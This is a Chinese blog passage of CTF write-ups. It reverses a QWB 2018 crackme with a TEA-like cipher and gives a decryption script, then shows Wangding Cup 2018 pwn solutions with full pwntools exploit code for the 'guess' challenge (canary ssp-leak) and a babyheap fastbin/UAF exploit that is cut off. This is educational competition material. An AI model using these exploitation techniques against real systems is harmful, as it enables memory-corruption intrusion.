<p>进入这个地址，发现ida没有将其识别称为一个函数，我们需要手动逆向分析。这通常发生在加壳、混淆或编译器优化过的代码中。</p>
<h3 id="逆向工程中的手动分析操作"><a href="#逆向工程中的手动分析操作" class="headerlink" title="逆向工程中的手动分析操作"></a><strong>逆向工程中的手动分析操作</strong></h3><p>反编译之后跟题解不一样</p>
<p>向上查看代码，寻找合适的函数起点</p>
<p><code>0x4C8EF4</code> 这个位置具有函数开头的典型特征（如ret或jmp后面基本就是一个函数的开头）</p>
<p>使用 <strong>Create Function</strong> 功能强制 IDA 将该地址识别为函数开头</p>
<p>这是个先验证后加密的函数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">signed __int64 sub_4C8EF4()</span><br><span class="line">&#123;</span><br><span class="line">  char *v0; // rdi</span><br><span class="line">  __int64 *v1; // rsi</span><br><span class="line">  unsigned __int64 i; // rdx</span><br><span class="line"></span><br><span class="line">  if ( strlen(qword_6CCDB0) == 21  //验证</span><br><span class="line">    &amp;&amp; qword_6CCDB0[1] == &#x27;w&#x27;</span><br><span class="line">    &amp;&amp; qword_6CCDB0[2] == &#x27;b&#x27;</span><br><span class="line">    &amp;&amp; qword_6CCDB0[3] == &#x27;&#123;&#x27;</span><br><span class="line">    &amp;&amp; qword_6CCDB0[20] == &#x27;&#125;&#x27; )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_4C8CC0((__int64)&amp;qword_6CCDB0[4]);</span><br><span class="line">    sub_4C8E50(&amp;qword_6CCDB0[4]);</span><br><span class="line">    sub_4C8CC0((__int64)&amp;qword_6CCDB0[4]);</span><br><span class="line">    sub_4C8E50(&amp;qword_6CCDB0[4]);</span><br><span class="line">    sub_4C8CC0((__int64)&amp;qword_6CCDB0[4]);</span><br><span class="line">    v0 = &amp;qword_6CCDB0[4];</span><br><span class="line">    sub_4C8E50(&amp;qword_6CCDB0[4]);</span><br><span class="line">    v1 = qword_4C8CB0;// 加载预存的标准答案</span><br><span class="line">    for ( i = 0LL; i &lt; 0x10 &amp;&amp; *v0 == *(_BYTE *)v1; ++i )//逐字节比对</span><br><span class="line">    &#123;</span><br><span class="line">      ++v0;</span><br><span class="line">      v1 = (__int64 *)((char *)v1 + 1);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  __asm &#123; syscall; LINUX - sys_write &#125;</span><br><span class="line">  return sys_exit(0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>flag的格式为qwb{x*16}</p>
<p>进入sub_4C8CC0，很像tea加密：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 __fastcall sub_4C8CC0(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned __int64 result; // rax</span><br><span class="line">  unsigned int v2; // [rsp+18h] [rbp-48h]</span><br><span class="line">  unsigned int v3; // [rsp+1Ch] [rbp-44h]</span><br><span class="line">  unsigned int v4; // [rsp+20h] [rbp-40h]</span><br><span class="line">  int i; // [rsp+24h] [rbp-3Ch]</span><br><span class="line">  int j; // [rsp+28h] [rbp-38h]</span><br><span class="line">  int v7[6]; // [rsp+40h] [rbp-20h] BYREF</span><br><span class="line">  unsigned __int64 v8; // [rsp+58h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(0x28u);</span><br><span class="line">  qmemcpy(v7, &quot;s1IpP3rEv3Ryd4Y3&quot;, 16);</span><br><span class="line">  for ( i = 0; i &lt;= 1; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = 0;</span><br><span class="line">    v2 = *(_DWORD *)(8 * i + a1);</span><br><span class="line">    v3 = *(_DWORD *)(a1 + 4 + 8 * i);</span><br><span class="line">    for ( j = 0; j &lt;= 7; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 += (v7[v4 &amp; 3] + v4) ^ (((v3 &gt;&gt; 5) ^ (16 * v3)) + v3);</span><br><span class="line">      v4 += 0x676E696C;</span><br><span class="line">      v3 += (v7[(v4 &gt;&gt; 11) &amp; 3] + v4) ^ (((v2 &gt;&gt; 5) ^ (16 * v2)) + v2);</span><br><span class="line">    &#125;</span><br><span class="line">    *(_DWORD *)(a1 + 8 * i) = v2;</span><br><span class="line">    *(_DWORD *)(a1 + 4 + 8 * i) = v3;</span><br><span class="line">  &#125;</span><br><span class="line">  result = __readfsqword(0x28u) ^ v8;</span><br><span class="line">  if ( result )</span><br><span class="line">    return ((__int64 (*)(void))loc_4C8B9A)();</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">_BYTE *__fastcall sub_4C8E50(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  _BYTE *result; // rax</span><br><span class="line">  int i; // [rsp+14h] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  for ( i = 0; i &lt;= 15; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (_BYTE *)(i + a1);</span><br><span class="line">    *result ^= i;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>异或</p>
<h3 id="解密exp"><a href="#解密exp" class="headerlink" title="解密exp"></a>解密exp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">keyPool = [1883844979, 1165112144, 2035430262, 861484132]</span><br><span class="line">array_car = [1735289196, 3470578392, 910900292, 2646189488, 86511388, 1821800584, 3557089780, 997411680]</span><br><span class="line">target = [0x7f13b852, 0x1bf28c35, 0xd28663f4, 0x311e4f73]</span><br><span class="line"></span><br><span class="line">def de_xor(enc):</span><br><span class="line">    for _i in range(4):</span><br><span class="line">        current = enc[_i]</span><br><span class="line">        a = current &amp; 0xFF</span><br><span class="line">        b = (current &amp; 0xFF00) &gt;&gt; 8</span><br><span class="line">        c = (current &amp; 0xFF0000) &gt;&gt; 16</span><br><span class="line">        d = (current &amp; 0xFF000000) &gt;&gt; 24</span><br><span class="line">        a ^= (_i * 4 + 0)</span><br><span class="line">        b ^= (_i * 4 + 1)</span><br><span class="line">        c ^= (_i * 4 + 2)</span><br><span class="line">        d ^= (_i * 4 + 3)</span><br><span class="line">        # 修正此处：添加缺失的位或运算符 |</span><br><span class="line">        enc[_i] = a | (b &lt;&lt; 8) | (c &lt;&lt; 16) | (d &lt;&lt; 24)</span><br><span class="line">    return enc</span><br><span class="line"></span><br><span class="line">def encrypt(i32_para1, i32_para2):</span><br><span class="line">    foo = i32_para1</span><br><span class="line">    bar = i32_para2</span><br><span class="line">    car = 0</span><br><span class="line">    for _i in range(8):</span><br><span class="line">        tmp_a = keyPool[(car &amp; 3)] + car</span><br><span class="line">        tmp_b = ((bar &gt;&gt; 5) ^ (bar &lt;&lt; 4)) + bar</span><br><span class="line">        foo += tmp_a ^ tmp_b</span><br><span class="line">        foo &amp;= 0xffffffff</span><br><span class="line">        car += 1735289196</span><br><span class="line">        car &amp;= 0xffffffff</span><br><span class="line">        tmp_a = keyPool[((car &gt;&gt; 11) &amp; 3)] + car</span><br><span class="line">        tmp_b = ((foo &gt;&gt; 5) ^ (16 * foo)) + foo</span><br><span class="line">        bar += tmp_a ^ tmp_b</span><br><span class="line">        bar &amp;= 0xffffffff</span><br><span class="line">    return foo, bar</span><br><span class="line"></span><br><span class="line">def solver(enc_foo, enc_bar):</span><br><span class="line">    foo = enc_foo</span><br><span class="line">    bar = enc_bar</span><br><span class="line">    car = array_car[7]</span><br><span class="line">    for _i in range(8):</span><br><span class="line">        tmp_a = keyPool[((car &gt;&gt; 11) &amp; 3)] + car</span><br><span class="line">        tmp_b = ((foo &gt;&gt; 5) ^ (16 * foo)) + foo</span><br><span class="line">        bar -= tmp_a ^ tmp_b</span><br><span class="line">        bar = (bar + 0xffffffff + 1) &amp; 0xffffffff</span><br><span class="line">        car -= 1735289196</span><br><span class="line">        car = (car + 0xffffffff + 1) &amp; 0xffffffff</span><br><span class="line">        tmp_a = keyPool[(car &amp; 3)] + car</span><br><span class="line">        tmp_b = ((bar &gt;&gt; 5) ^ (bar &lt;&lt; 4)) + bar</span><br><span class="line">        foo -= tmp_a ^ tmp_b</span><br><span class="line">        foo = (foo + 0xffffffff + 1) &amp; 0xffffffff</span><br><span class="line">    return foo, bar</span><br><span class="line"></span><br><span class="line"># 执行流程</span><br><span class="line">target = de_xor(target.copy())  # 避免修改原始列表</span><br><span class="line">print(&quot;=====&quot;)</span><br><span class="line">for t in target:</span><br><span class="line">    print(hex(t))</span><br><span class="line"></span><br><span class="line">for i in range(2):</span><br><span class="line">    target[i * 2], target[i * 2 + 1] = solver(target[i * 2], target[i * 2 + 1])</span><br><span class="line"></span><br><span class="line">print(&quot;=====&quot;)</span><br><span class="line">for t in target:</span><br><span class="line">    print(hex(t))</span><br><span class="line"></span><br><span class="line">target = de_xor(target.copy())</span><br><span class="line">print(&quot;=====&quot;)</span><br><span class="line">for t in target:</span><br><span class="line">    print(hex(t))</span><br><span class="line"></span><br><span class="line">for i in range(2):</span><br><span class="line">    target[i * 2], target[i * 2 + 1] = solver(target[i * 2], target[i * 2 + 1])</span><br><span class="line"></span><br><span class="line">print(&quot;=====&quot;)</span><br><span class="line">for t in target:</span><br><span class="line">    print(hex(t))</span><br><span class="line"></span><br><span class="line">target = de_xor(target.copy())</span><br><span class="line">print(&quot;=====&quot;)</span><br><span class="line">for t in target:</span><br><span class="line">    print(hex(t))</span><br><span class="line"></span><br><span class="line">for i in range(2):</span><br><span class="line">    target[i * 2], target[i * 2 + 1] = solver(target[i * 2], target[i * 2 + 1])</span><br><span class="line"></span><br><span class="line">print(&quot;=====&quot;)</span><br><span class="line">for t in target:</span><br><span class="line">    print(t)</span><br><span class="line"></span><br><span class="line"># 最终输出解码字符串</span><br><span class="line">print(&quot;=====&quot;)</span><br><span class="line">result = b&#x27;&#x27;.join([bytes.fromhex(hex(t)[2:])[::-1] for t in target]).decode(&#x27;utf-8&#x27;)</span><br><span class="line">print(result)  # 应输出 &quot;f1Nd_TH3HldeC0dE&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="baby-re"><a href="#baby-re" class="headerlink" title="baby_re"></a>baby_re</h2>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2018/11/16/qwb2018-re/" data-id="cuidEac2FpQt1rlsf9j_KPAQj" data-title="qwb2018-re" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-2018网鼑杯ctf" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2018/11/10/2018%E7%BD%91%E9%BC%91%E6%9D%AFctf/" class="article-date">
  <time class="dt-published" datetime="2018-11-10T03:07:10.000Z" itemprop="datePublished">2018-11-10</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2018/11/10/2018%E7%BD%91%E9%BC%91%E6%9D%AFctf/">2018 网鼎杯ctf</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="guess"><a href="#guess" class="headerlink" title="guess"></a>guess</h3><img src="2018%E7%BD%91%E9%BC%91%E6%9D%AFctf/image-20251122095728795.png" alt="image-20251122095728795" style="zoom: 67%;" />

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">╭─Tac1t0rnX@MacBookPro ~/Binary/CTF/2018/wdb-2018/Pwn/guess/workspace ‹›</span><br><span class="line">╰─$ checksec guess</span><br><span class="line">[*] <span class="string">&#x27;/Users/apple/Binary/CTF/2018/wdb-2018/Pwn/guess/workspace/guess&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE 0x400000</span><br></pre></td></tr></table></figure>

<p>题目中能够3次<code>fork</code>出子进程，父进程<code>wait</code>等待子进程技术，并且一开始就将flag 读到了栈上</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="built_in">HIDWORD</span>(stat_loc.__iptr) == <span class="number">-1</span> )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">perror</span>(<span class="string">&quot;./flag.txt&quot;</span>);</span><br><span class="line">    _exit(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">read</span>(<span class="built_in">SHIDWORD</span>(stat_loc.__iptr), &amp;flag, <span class="number">0x30uLL</span>);</span><br><span class="line"><span class="built_in">close</span>(<span class="built_in">SHIDWORD</span>(stat_loc.__iptr));</span><br></pre></td></tr></table></figure>
<p>题目在子进程和父进程共享的代码空间中有一个简单的栈溢出，但是由于开启了Canary所以无法直接溢出Getshell</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( choices &gt;= v7 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;you have no sense... bye :-) &quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  pid = <span class="built_in">sub_400A11</span>();</span><br><span class="line">  <span class="keyword">if</span> ( !pid )                                 <span class="comment">// 子进程逃脱</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  ++choices;</span><br><span class="line">  <span class="built_in">wait</span>((__WAIT_STATUS)&amp;stat_loc);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Please type your guessing flag&quot;</span>);</span><br><span class="line"><span class="built_in">gets</span>((__int64)&amp;guessing_flag);                <span class="comment">// stack oveflow</span></span><br><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;flag, &amp;guessing_flag) )</span><br></pre></td></tr></table></figure>
<p>利用Canary <em>ssp-leak</em> 报错输出 我们利用3次<code>fork</code>出子进程的机会，可以打印3个地址，由于flag在stack上，所以我们利用这3次打印机会分别打印:</p>
<ol>
<li>0x602020-&gt;<em>_IO_2_1_stdout</em> 泄露libc</li>
<li><em>environ</em>-&gt;stack address 泄露栈地址</li>
<li>flag’s address -&gt;打印输出flag</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/usr/env/bin python</span></span><br><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> :io.recv()</span><br><span class="line">rn = <span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line">rud = <span class="keyword">lambda</span> x:io.recvuntil(x,drop=<span class="literal">True</span>)</span><br><span class="line">rl = <span class="keyword">lambda</span> :io.recvline()</span><br><span class="line">se = <span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">sel = <span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">sea = <span class="keyword">lambda</span> x:io.sendafter(x)</span><br><span class="line">sela = <span class="keyword">lambda</span> x:io.sendlineafter(x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gdb_debug</span>(<span class="params">order</span>):</span><br><span class="line">    command = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> order:</span><br><span class="line">        command += <span class="built_in">str</span>(item)+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    log.info(<span class="string">&#x27;gdb command:\n&#x27;</span>+command)</span><br><span class="line">    gdb.attach(io,command)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">flag</span>):</span><br><span class="line">    ru(<span class="string">&#x27;Please type your guessing flag\n&#x27;</span>)</span><br><span class="line">    sel(p64(<span class="number">0x6020a0</span>)*<span class="number">0x100</span>)</span><br><span class="line">    ru(<span class="string">&#x27;*** stack smashing detected ***: &#x27;</span>)</span><br><span class="line">    libc.address = u64(rn(<span class="number">6</span>).ljust(<span class="number">0x8</span>,<span class="string">&#x27;\x00&#x27;</span>))-libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">    environ = libc.symbols[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line">    log.success(<span class="string">&#x27;environ:&#x27;</span>+<span class="built_in">hex</span>(environ))</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">&#x27;Please type your guessing flag\n&#x27;</span>)</span><br><span class="line">    sel(p64(environ)*<span class="number">0x100</span>)</span><br><span class="line">    ru(<span class="string">&#x27;*** stack smashing detected ***: &#x27;</span>)</span><br><span class="line">    stack = u64(rn(<span class="number">6</span>).ljust(<span class="number">0x8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    log.success(<span class="string">&#x27;stack:&#x27;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">&#x27;Please type your guessing flag\n&#x27;</span>)</span><br><span class="line">    sel(p64(stack-<span class="number">0x168</span>)*<span class="number">0x100</span>)</span><br><span class="line">    ru(<span class="string">&#x27;*** stack smashing detected ***: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    context.binary = <span class="string">&#x27;./guess&#x27;</span></span><br><span class="line">    context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;sp&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>,<span class="string">&#x27;-l&#x27;</span>,<span class="string">&#x27;115&#x27;</span>]</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">    elf = ELF(<span class="string">&#x27;./guess&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv)&gt;<span class="number">1</span>:</span><br><span class="line">        io = remote(sys.argv[<span class="number">1</span>],sys.argv[<span class="number">2</span>])</span><br><span class="line">        libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">        exploit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = process(<span class="string">&#x27;./guess&#x27;</span>)</span><br><span class="line">        libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">        exploit(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<h3 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h3><p>题目中有一个非常明显的UAF</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">v3 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Index:&quot;</span>);</span><br><span class="line"><span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x10uLL</span>);</span><br><span class="line"><span class="built_in">read</span>(<span class="number">0</span>, &amp;s, <span class="number">0xFuLL</span>);</span><br><span class="line">v1 = <span class="built_in">atoi</span>(&amp;s);</span><br><span class="line"><span class="keyword">if</span> ( v1 &lt;= <span class="number">9</span> &amp;&amp; ptr[v1] )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">free</span>(ptr[v1]);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v3;</span><br></pre></td></tr></table></figure>

<p>题目的难度在于<code>malloc</code>的大小固定为0x20，0x20的大小很尴尬，几乎什么也干不了……<br>思路于是比较确定，通过在chunk空间内改造合适的<em>Chunk_Size</em>,通过<em>Fastbin Attack</em> 构造<em>Overlapping Chunk</em></p>
<p>通过Overlapping Chunk更改<em>Size</em>，进行<em>Unlink</em>，拿到一个指向.bss段的指针后就好办了。<br>还有一个问题，就是题目中限制了分配的个数和进行Edit操作的个数，所以姿势需要优雅一些。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/usr/env/bin python</span></span><br><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> :io.recv()</span><br><span class="line">rn = <span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line">rud = <span class="keyword">lambda</span> x:io.recvuntil(x,drop=<span class="literal">True</span>)</span><br><span class="line">rl = <span class="keyword">lambda</span> 